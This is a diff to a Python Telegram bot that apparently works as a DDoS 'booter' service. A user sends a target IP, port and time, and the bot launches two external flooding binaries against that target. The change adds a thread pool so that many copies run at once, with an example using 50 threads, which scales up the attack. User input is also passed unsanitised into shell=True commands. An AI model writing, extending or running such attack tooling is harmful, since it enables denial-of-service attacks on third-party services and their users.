@@ -131,13 +131,34 @@ def process_attack(message):
     except Exception:
         bot.reply_to(message, "⚠️ **Invalid Format.** Use: `IP PORT TIME`")
 
-def run_attack_process(u_id, b_path, v_path, target, port, duration):
+import subprocess
+import time
+from concurrent.futures import ThreadPoolExecutor
+
+def execute_task(cmd):
     try:
-        subprocess.Popen(f"{b_path} {target} {port} {duration} 200", shell=True)
-        time.sleep(2)
-        subprocess.Popen(f"{v_path} {target} {port} {duration} 200", shell=True)
+        subprocess.run(cmd, shell=True)
+    except Exception:
+        pass
+
+def run_attack_process(u_id, b_path, v_path, target, port, duration, thread_count=10):
+    cmd1 = f"{b_path} {target} {port} {duration} 200"
+    cmd2 = f"{v_path} {target} {port} {duration} 200"
+    
+    # Use ThreadPoolExecutor to scale threads
+    with ThreadPoolExecutor(max_workers=thread_count) as executor:
+        for _ in range(thread_count):
+            executor.submit(execute_task, cmd1)
+            executor.submit(execute_task, cmd2)
+
+    # Log command execution
+    try:
         log_command(u_id, target, port, duration)
-    except Exception: pass
+    except NameError:
+        pass
+
+# Example usage:
+# run_attack_process("user1", "./bin1", "./bin2", "127.0.0.1", 80, 60, thread_count=50)
 
 @bot.message_handler(func=lambda message: message.text == 'ℹ️ My Info')
 def my_info(message):
@@ -180,4 +201,5 @@ if __name__ == '__main__':
             bot.polling(none_stop=True, interval=0, timeout=40)
         except Exception as e:
             time.sleep(5)
+
 
